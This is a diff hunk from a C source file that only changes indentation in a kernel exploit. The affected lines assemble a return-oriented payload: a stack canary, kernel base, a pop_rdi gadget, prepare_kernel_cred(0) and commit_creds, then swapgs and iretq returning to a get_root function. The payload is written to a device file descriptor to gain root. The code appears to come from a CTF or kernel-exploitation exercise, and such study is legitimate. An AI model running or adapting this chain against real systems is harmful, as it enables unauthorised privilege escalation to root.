@@ -350,20 +350,20 @@ int main(){
 
 	unsigned long payload[40];
 	int offset = 16;
-	  payload[offset++] = canary;
-	  payload[offset++] = kbase;
-	  payload[offset++] = pop_rdi;
-	  payload[offset++] = 0x0;
-	  payload[offset++] = prepare_kernel_cred;
-	  payload[offset++] = commit_creds;
-	  payload[offset++] = swapgs;
-	  payload[offset++] = 0x0;
-	  payload[offset++] = iretq;
-	  payload[offset++] = (unsigned long) get_root;
-	  payload[offset++] = user_cs;
-	  payload[offset++] = user_rflags;
-	  payload[offset++] = user_sp;
-	  payload[offset++] = user_ss;
+	payload[offset++] = canary;
+	payload[offset++] = kbase;
+	payload[offset++] = pop_rdi;
+	payload[offset++] = 0x0;
+	payload[offset++] = prepare_kernel_cred;
+	payload[offset++] = commit_creds;
+	payload[offset++] = swapgs;
+	payload[offset++] = 0x0;
+	payload[offset++] = iretq;
+	payload[offset++] = (unsigned long) get_root;
+	payload[offset++] = user_cs;
+	payload[offset++] = user_rflags;
+	payload[offset++] = user_sp;
+	payload[offset++] = user_ss;
 	write(fd, payload, sizeof(payload));
 	return 0;
 }
